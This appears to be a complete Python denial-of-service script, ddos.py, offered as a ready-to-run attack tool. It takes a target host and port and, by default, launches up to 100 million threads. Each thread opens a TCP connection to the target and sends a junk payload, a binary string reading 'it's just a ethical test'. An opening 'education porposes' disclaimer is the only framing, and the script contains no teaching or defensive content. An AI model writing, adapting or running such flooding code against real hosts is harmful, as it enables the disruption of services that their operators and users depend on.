print("Welcome to ddos.py. This is only for education porposes\n")
from asyncio import protocols
from pstats import SortKey
import sys
import os
try:
    import threading
except:
    while True:
        o = input("you haven't install 'threading' it will be installed \nDo you want to continue? [Y/n] ")
        if o == 'y':
            break
        elif o == 'n':
            quit()
        else:
            continue
    os.system('python -m pip install threading')
    import threading
import socket
try:
    from IPy import IP
except:
    while True:
        o = input("you haven't install 'Ipy' it will be installed \nDo you want to continue? [Y/n] ")
        if o == 'y':
            break
        elif o == 'n':
            quit()
        else:
            continue
    os.system('python -m pip install Ipy')
    from IPy import IP

b = len(sys.argv)

if b < 3:
    print("enter all required arguments\n\npython ddos {ip/website} {port}")
    quit()
else:
    b = "01101001 01110100 00100111 01110011 00100000 01101010 01110101 01110011 01110100 00100000 01100001 00100000 01100101 01110100 01101000 01101001 01100011 01100001 01101100 00100000 01110100 01100101 01110011 01110100"
    b = b.encode()
    arg1 = sys.argv[1]
    arg2 = sys.argv[2]
    try:
        arg3 = sys.argv[3]
        arg3 = int(arg3)
    except:
        print("No threads given, default set to '100000000'")
        arg3 = 100000000
    s = socket.socket()
    s.settimeout(3)
    try:
        arg1 = socket.gethostbyname(arg1)
    except:
        try:
            try:
                arg1 = int(arg1)
            except:
                print("you haven't gave a valid website")
                quit()
            try:
                arg2 = int(arg2)
            except:
                print("please enter a valid port")
                quit()
            s.connect(arg1, arg2)
        except:
            print("can't resolve host please check the ip and port")
            quit()
    s.close()
    arg2 = int(arg2)
    def attack():
            s = socket.socket()
            s.connect((arg1, arg2))
            s.send(b)
            s.send(b)
            s.close()
    l=0
    while True:
        if l == arg3:
            quit()
        l = l+1
        t = threading.Thread(target=attack)
        try:
            t.start()
        except:
            pass
    print("Attacks are done now")
    quit()
    
